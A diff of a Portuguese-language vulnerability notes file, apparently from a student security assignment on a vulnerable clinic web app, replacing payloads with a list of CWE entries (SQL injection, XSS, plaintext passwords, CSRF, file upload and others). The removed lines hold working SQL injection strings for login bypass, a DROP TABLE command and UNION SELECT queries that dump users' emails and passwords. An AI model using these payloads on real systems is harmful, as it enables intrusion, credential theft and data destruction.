@@ -1,29 +1,55 @@
 analysis: contains scripts/textual descriptions/logs/screen captures demonstrating the exploration of each vulnerability;
 
 
-login -> password
-
-login com o user
-' or 1=1 ) -- //
-
-login com user 1 (admin)
-') or 1=1 -- //
+sql injection nos doctors, login e register
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+- https://cwe.mitre.org/data/definitions/89.html
 
 
-register -> qualquer campo
-'); DROP TABLE app_user; -- //
+erros do sql injection nos doctors:
+- CWE-209: Generation of Error Message Containing Sensitive Information
+- https://cwe.mitre.org/data/definitions/209.html
 
 
-doctor -> search
-
-mostrar tabelas
-1' AND 1=2 UNION SELECT sql,1,1 FROM sqlite_master WHERE type='table' -- //
-
-mostrar users, emails, passwords
-1' AND 1=2 UNION SELECT name_, email, password_ FROM app_user -- //
+feedback nao tem scape
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+- https://cwe.mitre.org/data/definitions/79.html
 
 
-feedback -> comentar
+guardar as passes como plain text
+- CWE-256: Plaintext Storage of a Password
+- https://cwe.mitre.org/data/definitions/256.html
 
-<script> </script> ....
 
+reserved_area -> upload de ficheiros maliciosos
+- CWE-434: Unrestricted Upload of File with Dangerous Type
+- https://cwe.mitre.org/data/definitions/434.html
+
+
+reserved_area -> upload de ficheiros grandes
+- CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion')
+- https://cwe.mitre.org/data/definitions/400.html
+
+
+test_results -> nao verifica as perms
+- CWE-862: Missing Authorization
+- https://cwe.mitre.org/data/definitions/862.html
+
+
+sem csrf token -> settings
+- CWE-352: Cross-Site Request Forgery (CSRF)
+- https://cwe.mitre.org/data/definitions/352.html
+
+
+alterar password sem verificar a antiga
+- CWE-620: Unverified Password Change
+- https://cwe.mitre.org/data/definitions/620.html
+
+
+password fraca
+- CWE-521: Weak Password Requirements
+- https://cwe.mitre.org/data/definitions/521.html
+
+
+HA TANTAS Q TEMOS Q N SABEMOS COMO CORRIGIR que nao tao listadas.........
+tipo se corrigirmos estas, ficam ainda umas quantas, mas com cenas repetidas
